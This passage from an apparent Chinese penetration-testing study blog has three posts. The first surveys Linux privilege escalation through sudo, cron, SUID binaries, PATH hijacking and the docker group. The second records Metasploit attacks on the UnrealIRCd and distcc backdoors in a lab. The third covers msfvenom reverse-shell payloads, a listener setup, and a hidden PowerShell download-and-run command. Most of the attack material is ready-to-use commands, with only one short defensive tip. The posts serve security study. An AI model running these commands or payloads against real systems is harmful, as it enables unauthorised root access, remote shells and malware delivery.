<h4 id="明文-root-密码提权"><a href="#明文-root-密码提权" class="headerlink" title="明文 root 密码提权"></a>明文 root 密码提权</h4><p>情况极少。。。。</p>
<p>passwd 储存了用户，全用户可读，root 可写 shadow 存储密码的 hash，仅 root 可读写</p>
<p>passwd 文件：</p>
<p><img src="/2020/04/29/linux-ti-quan-zong-shu/QQ%E6%88%AA%E5%9B%BE20200429144854.png" alt></p>
<p>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了（这样非 root 就看不到了）。而 shadow 里面最重要的就是密码的 hash</p>
<p><img src="/2020/04/29/linux-ti-quan-zong-shu/QQ%E6%88%AA%E5%9B%BE20200430191351.png" alt></p>
<p>以非root用户打开，提示没有权限。</p>
<h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>查看两个文件：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ls</span> -l <span class="string">/etc/passwd</span> <span class="string">/etc/shadow</span></span><br></pre></td></tr></table></figure>

<h5 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h5><ul>
<li>shadow中存储了用户的密码hash，但是如果passwd可写，将passwd中的x改为一个已知密码的hash，那么系统在验证密码时将以passwd的为准。</li>
<li>shadow可读的情况下，可以使用john或其他来进行暴力破解hash。</li>
</ul>
<h4 id="sudo-滥用"><a href="#sudo-滥用" class="headerlink" title="sudo 滥用"></a>sudo 滥用</h4><p>sudo 是一个linux经常用到的命令，比如执行权限不够时加 sudo 执行，sudo 是让普通用户使用超级用户的命令。其配置文件为 <strong>/etc/sudoers</strong>，文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证。</p>
<p>查看可以执行哪些命令，即不需要知道 root 密码时，需验证自身普通权限的密码</p>
<p><code>sudo -l</code></p>
<p><img src="/2020/04/29/linux-ti-quan-zong-shu/QQ%E6%88%AA%E5%9B%BE20200429163933.png" alt></p>
<p>可以支持所有命令，下面参考这个网址:</p>
<blockquote>
<p><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p>
</blockquote>
<p>这里以 awk、man 举例</p>
<p><strong>1、su</strong></p>
<blockquote>
<p>sudo su</p>
</blockquote>
<p>输入普通权限用户密码，切换为 root</p>
<p><img src="/2020/04/29/linux-ti-quan-zong-shu/QQ%E6%88%AA%E5%9B%BE20200429164436.png" alt></p>
<p><strong>2、awk</strong></p>
<blockquote>
<p>sudo awk ‘BEGIN {system(“/bin/sh”)}’</p>
</blockquote>
<p><img src="/2020/04/29/linux-ti-quan-zong-shu/QQ%E6%88%AA%E5%9B%BE20200429164548.png" alt></p>
<p><strong>3、man</strong></p>
<blockquote>
<p>sudo man man</p>
</blockquote>
<p><img src="/2020/04/29/linux-ti-quan-zong-shu/QQ%E6%88%AA%E5%9B%BE20200429164826.png" alt></p>
<p><img src="/2020/04/29/linux-ti-quan-zong-shu/QQ%E6%88%AA%E5%9B%BE20200429164919.png" alt></p>
<blockquote>
</blockquote>
<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><blockquote>
<p>ls -l /etc/cron*</p>
</blockquote>
<p>非 root 权限的用户是不可以列出 root 用户的计划任务的。但是 /etc/ 内系统的计划任务可以被列出，并且默认这些程序以 root 权限执行 </p>
<p><strong>重写 python</strong></p>
<p>若这些计划任务的脚本可写，则编辑为 shell</p>
<p>crontab 文件是计划任务的配置，此文件只有 root 可写，我们不需要去修改 crontab，只查看里面的有哪些任务，比如定时执行了哪些脚本，再查看对应脚本的权限，若可写，则修改它。</p>
<p>测试：</p>
<blockquote>
<p>cat /etc/crontab</p>
</blockquote>
<p><img src="/2020/04/29/linux-ti-quan-zong-shu/QQ%E6%88%AA%E5%9B%BE20200429165555.png" alt></p>
<p>我没有设置定时任务，模拟一下，如果里面有个 <code>1.python</code></p>
<blockquote>
<p>ls -al /tmp/1.py //查看是否有w权限 </p>
<p>cat -al /tmp/1.py //写入代码  import os os.system(‘cp /bin/sh /tmp/sh’) os.system(‘chmod u+s /tmp/sh’) </p>
</blockquote>
<p>当到了计划执行时间，就会以 root 权限执行 1.py，即将 /bin/sh 复制到 /tmp/sh</p>
<p>原本是没有 /tmp/sh</p>
<p>当执行 <code>sudo python 1.py</code> 时，就会复制到 /tmp/sh </p>
<p>我们只需要进入 /tmp，执行 ./sh 可获取 root</p>
<p>这里的 cp 命令是基于 SUID，给 1.py 设置 SUID 权限。可以结合环境变量方式，把 /tmp/sh 添加到环境变量，无需进入 /tmp/sh 去执行 ./sh，执行 sh 变为 root。也可以在 1.py 写入反弹 shell 的 python 代码，此时反弹的 shell 具有 root 权限</p>
<p><strong>防范：</strong> </p>
<p>crontab 任务千万不要写到 /etc/crontab 文件里。通过 crontab -e 去创建，让他写到默认的 /var/spool/cron下；创建任务时，避免使用 root 去创建任务，若用 root 创建任务，注意设置权限，避免 root 权限执行任务。</p>
<h4 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h4><p>​    SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行,ls 查看时有 s 属性才支持 SUID。比如passwd命令，就是以root权限运行来修改shadow的。</p>
<p>​    suid提权：</p>
<p>​    利用拥有suid的文件执行命令，从而提升权限至root</p>
<h5 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h5><p>常见可用来提权的linux可行性的文件列表如下：</p>
<ul>
<li>Nmap</li>
<li>Vim</li>
<li>find</li>
<li>Bash</li>
<li>More</li>
<li>Less</li>
<li>Nano</li>
<li>cp</li>
</ul>
<p>查找系统上运行的所有SUID可执行文件：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">1. <span class="builtin-name">find</span> / -user root -perm -4000 -<span class="builtin-name">print</span> 2&gt;/dev/<span class="literal">null</span></span><br><span class="line">2. <span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line">3. <span class="builtin-name">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/29/linux-ti-quan-zong-shu/QQ%E6%88%AA%E5%9B%BE20200429145451.png" alt></p>
<h5 id="例NMAP"><a href="#例NMAP" class="headerlink" title="例NMAP"></a>例NMAP</h5><p>较旧版本的Nmap（2.02至5.21）具有交互模式，允许用户执行shell命令。由于Nmap在使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</p>
<p>交互模式可以通过执行Nmap参数” interactive “</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure>

<p>以下命令将提供一个提升的shell。</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">nmap&gt; !<span class="keyword">sh</span></span><br><span class="line"><span class="keyword">sh-3.2# </span>whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>也可以通过Metasploit模块对Nmap的二进制文件进行权限提升。</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">exploit/unix/<span class="keyword">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure>

<h5 id="例Find"><a href="#例Find" class="headerlink" title="例Find"></a>例Find</h5><p>如果Find命令也是以Suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">touch</span> <span class="string">pentestlab</span></span><br><span class="line"><span class="attr">find</span> <span class="string">pentestlab -exec whoami \;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">touch getflag</span><br><span class="line"><span class="built_in">find</span> / -<span class="built_in">type</span> f -<span class="built_in">name</span> getflag -<span class="built_in">exec</span> <span class="string">"whoami"</span> \;</span><br><span class="line"><span class="built_in">find</span> / -<span class="built_in">type</span> f -<span class="built_in">name</span> getflag -<span class="built_in">exec</span> <span class="string">"/bin/sh"</span> \;</span><br></pre></td></tr></table></figure>

<h5 id="例VIM"><a href="#例VIM" class="headerlink" title="例VIM"></a>例VIM</h5><p>Vim是Linux环境下的一款文件编辑器。但是，如果以SUID运行的话，它会继承root用户的权限，因此可以读取系统上的所有文件。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim.tiny <span class="regexp">/etc/</span>shadow</span><br></pre></td></tr></table></figure>

<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">vim.tiny</span><br><span class="line"><span class="comment"># Press ESC key</span></span><br><span class="line">:set <span class="keyword">shell</span><span class="bash">=/bin/sh</span></span><br><span class="line">:<span class="keyword">shell</span></span><br></pre></td></tr></table></figure>

<h5 id="例Bash"><a href="#例Bash" class="headerlink" title="例Bash"></a>例Bash</h5><p>以下命令将以root权限打开一个bash shell.</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2# id</span><br><span class="line"><span class="attribute">uid</span>=1002(service) <span class="attribute">gid</span>=1002(service) <span class="attribute">euid</span>=0(root) <span class="attribute">groups</span>=1002(serv</span><br></pre></td></tr></table></figure>

<h5 id="例Less"><a href="#例Less" class="headerlink" title="例Less"></a>例Less</h5><p>Less和More都执行以用来提权。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">less <span class="regexp">/etc/</span>passwd</span><br><span class="line">!<span class="regexp">/bin/</span>sh</span><br></pre></td></tr></table></figure>

<h4 id="环境变量劫持-SUID-扩展"><a href="#环境变量劫持-SUID-扩展" class="headerlink" title="环境变量劫持-SUID 扩展"></a>环境变量劫持-SUID 扩展</h4><p>通过劫持环境变量，达到执行任意命令的目的。上述只是执行 cat 命令，但我们最终目的是为了提权，而不是以 root 权限只执行单个 cat 命令。 </p>
<p>linux 下执行命令，如 cat，是去环境变量查找 ,将 cat 替换</p>
<p><strong>测试：</strong></p>
<p>把新建一个 /tmp/cat，而 cat 内容为我们脚本，当用户执行 cat 命令，cat /etc/shadow，则执行我们的脚本 </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">cat &gt;&gt; <span class="regexp">/tmp/</span>ls &lt;&lt;EOF  </span><br><span class="line"><span class="meta">#!/usr/bin/python  </span></span><br><span class="line">print <span class="string">"this is not the true cat"</span>  </span><br><span class="line">print <span class="string">"here is a root shell!"</span>  </span><br><span class="line"><span class="keyword">import</span> pty;pty.spawn(<span class="string">"/bin/sh"</span>)  </span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<p>此时再执行 ./suid-exp，可执行我们定义的脚本，因为 suid-exp 以管理员执行 cat 命令，而 linux 的 system 是根据环境变量来执行 cat 的，原本是默认的 cat，当修改了之后，cat 就不再是原来的 cat，而是我们自己定义的脚本，从而达到执行任意命令的目的，即可去提权。</p>
<h4 id="docker-组提权"><a href="#docker-组提权" class="headerlink" title="docker 组提权"></a>docker 组提权</h4><p>docker组用户提权，目的是利用docker组的用户来提权，因为docker组用户在容器下为root权限，通过挂载方式在容器下给本机添加sudo权限的用户，从而可以利用sudo命令。如果没有拥有sudo权限的用户，是无法执行sudo命令，在kali下会提示用户不在sudoers等提示。 </p>
<p>可以参考这篇文章：  《Docker提权实战测试》  <a href="https://www.secquan.org/Discuss/1070515" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1070515</a></p>
<h4 id="服务漏洞"><a href="#服务漏洞" class="headerlink" title="服务漏洞"></a>服务漏洞</h4><blockquote>
<p>netstat -antup #查看各种网络服务 </p>
</blockquote>
<p>然后把敏感端口转发出来，用本地的工具进行攻击，可能拿到远程 root，即通过漏洞拿到 root 权限 windows 用 lcx 做端口转发，linux 用 nc、socat 做端口转发</p>
<p><strong>1、redis 反弹 shell</strong></p>
<p>nc 单向转发</p>
<blockquote>
<p>nc -l 12345 | nc 192.168.191.170 80</p>
</blockquote>
<p>双向转发</p>
<blockquote>
<p>mkfifo backpipe nc -l 12345 0&lt;backpipe | nc 192.168.191.170 80 1&gt;backpipe </p>
</blockquote>
<p>双向转发本人测试失败，希望大佬们提供解决的办法</p>
<p>socat</p>
<p>测试本地转发，service apache2 start，把 80 端口转发到其它端口，看是否能访问，这里测试成功 </p>
<blockquote>
<p>socat TCP-LISTEN:8080,fork TCP:192.168.191.170:80 </p>
</blockquote>
<p>这里可以参考这篇文章，作者先执行 ps -fu root，发现开放 redis 端口，把 redis 端口转发出来，利用 redis 反弹远程的 root shell。一次简单 linux 提权:</p>
<blockquote>
<p><a href="https://www.secquan.org/Discuss/1069715#reply8" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1069715#reply8</a></p>
</blockquote>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.freebuf.com/articles/system/129549.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/129549.html</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1544037" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1544037</a></p>
<p><a href="https://www.xmsec.cc/guide-linux-privilege-escalation/" target="_blank" rel="noopener">https://www.xmsec.cc/guide-linux-privilege-escalation/</a></p>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>linux提权</tag>
      </tags>
  </entry>
  <entry>
    <title>经典漏洞msf攻击实验记录</title>
    <url>/2020/04/30/msf-gong-ji-shi-yan-ji-lu/</url>
    <content><![CDATA[<h2 id="经典漏洞MSF攻击实验记录"><a href="#经典漏洞MSF攻击实验记录" class="headerlink" title="经典漏洞MSF攻击实验记录"></a>经典漏洞MSF攻击实验记录</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这篇文章记录一些自己使用msf进行的一些实验。</p>
<h3 id="msf利用UnrealIRCd后门漏洞攻击"><a href="#msf利用UnrealIRCd后门漏洞攻击" class="headerlink" title="msf利用UnrealIRCd后门漏洞攻击"></a>msf利用UnrealIRCd后门漏洞攻击</h3><p><strong>攻击主机：</strong>Kali linux, IP地址：192.168.153.176</p>
<p><strong>漏洞主机：</strong>linux   IP地址：192.168.153.131</p>
<h4 id="nmap扫描开放端口"><a href="#nmap扫描开放端口" class="headerlink" title="nmap扫描开放端口"></a>nmap扫描开放端口</h4><p> 利用命令： nmap -sT -v 10.1.1.136 扫描漏洞主机开放端口信息,扫描结果如下</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sT -v <span class="number">192.168</span><span class="number">.153</span><span class="number">.131</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/30/msf-gong-ji-shi-yan-ji-lu/QQ%E6%88%AA%E5%9B%BE20200429210327.png" alt></p>
<h4 id="UnrealIRCd后门漏洞简介"><a href="#UnrealIRCd后门漏洞简介" class="headerlink" title="UnrealIRCd后门漏洞简介"></a>UnrealIRCd后门漏洞简介</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">CVE：CVE<span class="number">-2010</span><span class="number">-2075</span></span><br><span class="line"></span><br><span class="line">BID：BID<span class="number">-40820</span></span><br><span class="line"></span><br><span class="line">OSVDB：OSVDB<span class="number">-65445</span></span><br></pre></td></tr></table></figure>

<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>​        在2009年11月到2010年6月间分布于某些镜面站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码，影响系统/软件 Unreal UnrealIRCd 3.2.8.1。</p>
<h4 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h4><h5 id="1-分析可以利用的漏洞"><a href="#1-分析可以利用的漏洞" class="headerlink" title="1.分析可以利用的漏洞"></a>1.分析可以利用的漏洞</h5><p>根据Nmap扫描结果可知，6667号端口开放IRC服务，可以利用UnrealIRCD IRC软件的漏洞来攻击漏洞主机</p>
<h5 id="2-开启Msfconsole"><a href="#2-开启Msfconsole" class="headerlink" title="2. 开启Msfconsole"></a>2. 开启Msfconsole</h5><p>运行“msfconsole”命令开启msf</p>
<h5 id="3-搜索漏洞利用EXP"><a href="#3-搜索漏洞利用EXP" class="headerlink" title="3. 搜索漏洞利用EXP"></a>3. 搜索漏洞利用EXP</h5><p> 运行</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">search unrealircd</span></span><br></pre></td></tr></table></figure>

<p>命令搜索关于UnrealIRCD漏洞的利用信息</p>
<p><img src="/2020/04/30/msf-gong-ji-shi-yan-ji-lu/QQ%E6%88%AA%E5%9B%BE20200429210558.png" alt></p>
<h5 id="设置漏洞利用exp"><a href="#设置漏洞利用exp" class="headerlink" title="设置漏洞利用exp"></a>设置漏洞利用exp</h5><p>使用’show options’ 命令查看该exploit的参数设置信息，发现执行该EXP前可以配置漏洞主机的IP和端口</p>
<p><img src="/2020/04/30/msf-gong-ji-shi-yan-ji-lu/QQ%E6%88%AA%E5%9B%BE20200429211137.png" alt></p>
<h5 id="执行查看结果"><a href="#执行查看结果" class="headerlink" title="执行查看结果"></a>执行查看结果</h5><p>运行linux系统命令“whoami”，回显“root”说明当前shell的权限是root权限，可进行任意操作而不受权限控制，</p>
<p><img src="/2020/04/30/msf-gong-ji-shi-yan-ji-lu/QQ%E6%88%AA%E5%9B%BE20200429211204.png" alt></p>
<h3 id="利用Distcc后门漏洞攻击"><a href="#利用Distcc后门漏洞攻击" class="headerlink" title="利用Distcc后门漏洞攻击"></a>利用Distcc后门漏洞攻击</h3><h4 id="Distcc后门漏洞"><a href="#Distcc后门漏洞" class="headerlink" title="Distcc后门漏洞"></a>Distcc后门漏洞</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">安全组织索引</span><br><span class="line">CVE：CVE<span class="number">-2004</span><span class="number">-2687</span></span><br><span class="line">BID：无</span><br><span class="line">OSVDB：OSVDB<span class="number">-13378</span></span><br></pre></td></tr></table></figure>

<h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><pre><code>Distcc用于大量代码在网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，该漏洞是XCode 1.5版本及其他版本的distcc 2.x版本配置对于服务器端口的访问不限制，影响系统 distcc 2.x</code></pre><h4 id="攻击过程-1"><a href="#攻击过程-1" class="headerlink" title="攻击过程"></a>攻击过程</h4><ol>
<li><h5 id="开启Msfconsole"><a href="#开启Msfconsole" class="headerlink" title="开启Msfconsole"></a>开启Msfconsole</h5><p>运行<code>msfconsole</code>命令开启msf</p>
</li>
<li><h5 id="搜索漏洞利用EXP"><a href="#搜索漏洞利用EXP" class="headerlink" title="搜索漏洞利用EXP"></a>搜索漏洞利用EXP</h5><p>运行<code>search distcc</code>命令搜索关于Distcc_exec 漏洞的利用信息</p>
<p><img src="/2020/04/30/msf-gong-ji-shi-yan-ji-lu/QQ%E6%88%AA%E5%9B%BE20200429211425.png" alt></p>
</li>
</ol>
<ol start="3">
<li><h5 id="运行漏洞利用EXP"><a href="#运行漏洞利用EXP" class="headerlink" title="运行漏洞利用EXP"></a>运行漏洞利用EXP</h5><p>运行<code>use exploit/unix/misc/distcc_exec</code>命令开始运行EXP</p>
</li>
</ol>
<p><img src="/2020/04/30/msf-gong-ji-shi-yan-ji-lu/QQ%E6%88%AA%E5%9B%BE20200429211846.png" alt></p>
<p>设置漏洞主机IP</p>
<p>运行<code>set RHOST 10.1.1.136</code>命令设置漏洞主机IP</p>
<p>运行<code>exploit</code>命令，成功建立shell回话</p>
<h5 id="6-验证shell权限"><a href="#6-验证shell权限" class="headerlink" title="6.验证shell权限"></a>6.验证shell权限</h5><p>运行linux系统命令“whoami”，回显“root”说明当前shell的权限是root权限，可进行任意操作而不受权限控制.</p>
<p><img src="/2020/04/30/msf-gong-ji-shi-yan-ji-lu/QQ%E6%88%AA%E5%9B%BE20200429212150.png" alt></p>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>msf反弹payload学习</title>
    <url>/2020/04/27/msf-fan-dan-payload-xue-xi/</url>
    <content><![CDATA[<h2 id="学习msfvenom生成反弹payload总结"><a href="#学习msfvenom生成反弹payload总结" class="headerlink" title="学习msfvenom生成反弹payload总结"></a>学习msfvenom生成反弹payload总结</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><pre><code>我们知道目前来说流行的shell主要有两种，一种是正向shell(bind_shell)一种是反向shell(reverse_shell)</code></pre><p><strong>正向shell</strong>:攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。(攻击者-&gt;被攻击者)</p>
<p><strong>反向shell:</strong>被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。(攻击者&lt;-被攻击者)</p>
<p><strong>nc</strong>可以实现一个很简单的正向与反向shell连接的示例：</p>
<p>正向</p>
<p><img src="/2020/04/27/msf-fan-dan-payload-xue-xi/1208761-20190108155228561-656308830.png" alt></p>
<p>反向</p>
<p><img src="/2020/04/27/msf-fan-dan-payload-xue-xi/1208761-20190108140558839-392665606.png" alt></p>
<p>对于实际的渗透测试过程来说，我们常常使用的往往是反弹shell的方式来突破边界防火墙的限制。</p>
<p><strong>下面列举了一些使用反向shell的情况：</strong></p>
<ul>
<li>目标机器在一个不同（相对攻击者而言）的私有网络</li>
<li>目标机器的防火墙阻挡了所有入口连接（这种情况正向 Shell 是会被防火墙阻挡的）.</li>
<li>由于一些原因，你的 Payload 不能绑定在应该绑定的端口的时候</li>
<li>你还不能确定应该选择反向 Shell 还是正向 Shell 的时候</li>
</ul>
<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>​        msfvenom是msfpayload,msfencode的结合体，可利用msfvenom生成木马程序,并在目标机上执行,在本地监听上线。Msfvenom 在 2015 年 6 月 8 日已经替代了 msfpayload 与 msfenocde 命令，它是这两个命令的结合体。为了开始使用 msfvenom，可以首先浏览一下它所支持的命令参数：</p>
<p><img src="/2020/04/27/msf-fan-dan-payload-xue-xi/QQ%E6%88%AA%E5%9B%BE20200427142626.png" alt></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">Options:</span><br><span class="line">    -p, <span class="comment">--payload       &lt;payload&gt;    Payload to use. Specify a '-' or stdin to use custom payloads # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取</span></span><br><span class="line">        <span class="comment">--payload-options            List the payload's standard options # 列出指定 Payload 的标准可选配置项</span></span><br><span class="line">    -l, <span class="comment">--list          [type]       List a module type. Options are: payloads, encoders, nops, all # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, all</span></span><br><span class="line">    -n, <span class="comment">--nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload # 指定 nop 在 payload 中的数量（译者注：类似堆喷射中通过 nop 滑动到 payload）</span></span><br><span class="line">    -f, <span class="comment">--format        &lt;format&gt;     Output format (use --help-formats for a list) # 指定 Payload 的输出格式</span></span><br><span class="line">        <span class="comment">--help-formats               List available formats # 列出所有可用的输出格式</span></span><br><span class="line">    -e, <span class="comment">--encoder       &lt;encoder&gt;    The encoder to use # 指定使用的 Encoder</span></span><br><span class="line">    -a, <span class="comment">--arch          &lt;arch&gt;       The architecture to use # 指定目标系统架构</span></span><br><span class="line">        <span class="comment">--platform      &lt;platform&gt;   The platform of the payload # 指定目标系统平台</span></span><br><span class="line">        <span class="comment">--help-platforms             List available platforms # 列出可用的平台</span></span><br><span class="line">    -s, <span class="comment">--space         &lt;length&gt;     The maximum size of the resulting payload # 设置未经编码的 Payload 的最大长度</span></span><br><span class="line">        <span class="comment">--encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value) # 编码后的 Payload 的最大长度</span></span><br><span class="line">    -b, <span class="comment">--bad-chars     &lt;list&gt;       The list of characters to avoid example: '\x00\xff' # 设置需要在 Payload 中避免出现的字符</span></span><br><span class="line">    -i, <span class="comment">--iterations    &lt;count&gt;      The number of times to encode the payload # 设置 Payload 的编码次数</span></span><br><span class="line">    -c, <span class="comment">--add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include # 指定包含一个额外的win32 shellcode文件</span></span><br><span class="line">    -x, <span class="comment">--template      &lt;path&gt;       Specify a custom executable file to use as a template # 指定一个特定的可执行文件作为模板</span></span><br><span class="line">    -k, <span class="comment">--keep                       Preserve the template behavior and inject the payload as a new thread # 保护模板程序的功能，注入的payload作为一个新的进程运行</span></span><br><span class="line">    -o, <span class="comment">--out           &lt;path&gt;       Save the payload # 保存 Payload 到文件</span></span><br><span class="line">    -v, <span class="comment">--var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats # 指定一个变量名</span></span><br><span class="line">（译者注：当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）</span><br><span class="line">        <span class="comment">--smallest                   Generate the smallest possible payload # 尽可能生成最短的 Payload</span></span><br><span class="line">    -h, <span class="comment">--help                       Show this message # 帮助</span></span><br></pre></td></tr></table></figure>

<p>我们可以通过命令列出可用的payloads、encoders、nops。</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="comment">--list payloads</span></span><br><span class="line">msfvenom <span class="comment">--list encoders</span></span><br><span class="line">msfvenom <span class="comment">--list nops</span></span><br></pre></td></tr></table></figure>

<p>下面我们使用msf生成一些可用的反弹shell的paylaod。</p>
<h4 id="生成二进制文件"><a href="#生成二进制文件" class="headerlink" title="生成二进制文件"></a>生成二进制文件</h4><p>关于二进制文件，主要介绍适用于Windows、linux、mac操作系统的payload生成与利用。</p>
<h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=&lt;Your<span class="built_in"> IP </span>Address&gt; <span class="attribute">LPORT</span>=&lt;Your<span class="built_in"> Port </span><span class="keyword">to</span> Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=&lt;Your<span class="built_in"> IP </span>Address&gt; <span class="attribute">LPORT</span>=&lt;Your<span class="built_in"> Port </span><span class="keyword">to</span> Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<h5 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp <span class="attribute">LHOST</span>=&lt;Your<span class="built_in"> IP </span>Address&gt;<span class="attribute">LPORT</span>=&lt;Your<span class="built_in"> Port </span><span class="keyword">to</span> Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>

<h5 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h5><p>针对这个部分就以Windows为例，使用上面的命令生成一个exe的payload，命令如下：</p>
<p>攻击机:kali  192.168.153.176</p>
<p>靶机: win7   192.168.153.160</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.153</span><span class="number">.176</span> LPORT=<span class="number">5555</span> -f exe -o payload.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/27/msf-fan-dan-payload-xue-xi/QQ%E6%88%AA%E5%9B%BE20200427153433.png" alt></p>
<p>复制shell.exe到Windows机器，然后kali下开启msf使用如下命令监听4444端口：</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msfconsole    <span class="comment">//启动msf</span></span><br><span class="line"></span><br><span class="line">use exploit/multi/handler          <span class="comment">//使用msf的侦听模块exploit/multi/handler</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> PAYLOAD <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span>        //设置载荷<span class="comment">payload</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">set</span> <span class="comment">LHOST 192.168.153.176</span>               //设置本地监听机<span class="comment">Ip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LPORT  4444</span>              //设置监听端口</span><br><span class="line">     </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>执行完之后在Windows下执行payload.exe，然后结果如图：</p>
<p><img src="/2020/04/27/msf-fan-dan-payload-xue-xi/QQ%E6%88%AA%E5%9B%BE20200427153539.png" alt></p>
<p>在这里既然使用到了在Windows下执行应用程序，我们就大概盘点一下在Windows执行应用程序的几种方式：</p>
<ul>
<li>双击运行</li>
<li>cmd下运行exe</li>
<li>利用Powershell远程下载执行</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (<span class="built_in">new</span>-<span class="keyword">object</span> <span class="keyword">system</span>.net.webclient).downloadfile(<span class="string">'http://127.0.0.1:8089'</span>,<span class="string">'shell.exe'</span>);</span><br><span class="line"><span class="keyword">start</span>-process shell.exe</span><br></pre></td></tr></table></figure>

<ul>
<li>利用at或schtasks设置计划任务执行</li>
</ul>
